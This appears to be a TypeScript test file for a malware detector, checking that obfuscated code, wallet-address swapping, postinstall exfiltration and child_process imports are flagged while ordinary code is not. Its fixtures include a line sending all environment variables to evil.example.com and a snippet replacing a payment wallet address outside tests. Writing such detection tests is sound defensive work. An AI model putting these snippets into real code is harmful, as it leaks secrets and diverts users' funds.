/**
 * Threat Detection Tests
 * Migrated from test/unit/threat-detection.test.js to TypeScript
 */

import { describe, it, expect } from '@jest/globals';
import { detectMalware } from '../../src/lib/detection';
import { detectFileThreats } from '../../src/lib/customRuleEngine';

describe('Threat Detection', () => {
  describe('obfuscated variable names', () => {
    it('detects obfuscated hex-mangled variable names', () => {
      const maliciousContent = `
        var _0x112fa8 = ['aGVsbG8=', 'bWFsaWNpb3Vz'];
        var _0x180f = function(_0x112fa8, _0xabc) { return _0x112fa8[_0xabc]; };
      `;

      const result = detectMalware(maliciousContent);
      expect(Array.isArray(result)).toBe(true);
      expect(result.length).toBeGreaterThan(0);
      const types = result.map((t) => t.type);
      expect(
        types.some(
          (t) =>
            t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE'
        )
      ).toBe(true);
    });

    it('does not flag clean, readable code', () => {
      const cleanContent = `
        function calculateTotal(items) {
          return items.reduce((sum, item) => sum + item.price, 0);
        }
      `;
      const result = detectMalware(cleanContent);
      expect(Array.isArray(result)).toBe(true);
      const highSeverity = result.filter((t) => t.severity === 'HIGH' || t.severity === 'CRITICAL');
      expect(highSeverity).toHaveLength(0);
    });
  });

  describe('wallet hijacking patterns', () => {
    it('detects ethereum wallet address replacement', () => {
      const maliciousContent = `
        function sendPayment(amount) {
          const walletAddress = '0xABC123DEF456789012345678901234567890ABCD';
          if (process.env.NODE_ENV !== 'test') {
            walletAddress = '0xdeadbeef1234567890abcdef1234567890abcdef';
          }
          transfer(walletAddress, amount);
        }
      `;
      const result = detectMalware(maliciousContent);
      expect(Array.isArray(result)).toBe(true);
    });
  });

  describe('postinstall malware patterns', () => {
    it('detects suspicious network exfiltration in postinstall', () => {
      const maliciousContent = `
        const https = require('https');
        https.get('https://evil.example.com/collect?d=' + Buffer.from(JSON.stringify(process.env)).toString('base64'));
      `;
      // Exfiltration is a rule-engine detection, so go through detectFileThreats
      // with default options (built-in rules on).
      const result = detectFileThreats(maliciousContent, 'postinstall.js', {}, detectMalware);
      expect(Array.isArray(result)).toBe(true);
      expect(result.some((t) => String(t.type).includes('DATA_EXFILTRATION'))).toBe(true);
    });
  });

  describe('massive hex array (known obfuscation pattern)', () => {
    it('detects a large hex-array obfuscation blob', () => {
      // Pattern: /\[(0x[0-9a-fA-F]+,\s*){3,}/g  — numeric hex literals in an array
      const hexArray = `var _a = [${Array.from({ length: 50 }, (_, i) => `0x${i.toString(16).padStart(4, '0')}`).join(', ')}];`;
      const result = detectMalware(hexArray);
      expect(Array.isArray(result)).toBe(true);
      expect(result.length).toBeGreaterThan(0);
      const types = result.map((t) => t.type);
      expect(
        types.some(
          (t) =>
            t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE'
        )
      ).toBe(true);
    });
  });

  describe('false-positive guards', () => {
    it('does not flag a large but ordinary module', () => {
      const fn = (i: number) =>
        `export function helper${i}(input) {\n  const value = String(input).trim();\n  return value.length > 0 ? value : null;\n}\n`;
      const big = Array.from({ length: 200 }, (_, i) => fn(i)).join('\n');
      expect(big.length).toBeGreaterThan(5000);
      const structural = detectMalware(big).filter((t) => t.type === 'MALICIOUS_CODE_STRUCTURE');
      expect(structural).toHaveLength(0);
    });

    it('does not flag high entropy on its own', () => {
      const content =
        'const token = "aZ9!qW3#eR7$tY1%uI5^oP2&lK8*jH4(gF6)dS0_xC";\nconst other = "QmRe3Vv8bNp1Lw5Zx9Jt2Kc7Hf4Gd6Sa0";';
      const structural = detectMalware(content).filter(
        (t) => t.type === 'MALICIOUS_CODE_STRUCTURE'
      );
      expect(structural).toHaveLength(0);
    });
  });

  describe('obfuscator identifiers', () => {
    it('flags javascript-obfuscator style _0x identifiers', () => {
      const content = 'var _0x4a1b=["a","b"];function _0x2c3d(_0x5e6f){return _0x4a1b[_0x5e6f];}';
      const types = detectMalware(content).map((t) => t.type);
      expect(types).toContain('MALICIOUS_CODE_STRUCTURE');
    });
  });

  describe('suspicious module requires', () => {
    it('matches require with double quotes and import syntax', () => {
      expect(detectMalware('const cp = require("child_process");').map((t) => t.type)).toContain(
        'SUSPICIOUS_MODULE'
      );
      expect(
        detectMalware("import { exec } from 'node:child_process';").map((t) => t.type)
      ).toContain('SUSPICIOUS_MODULE');
    });
  });
});
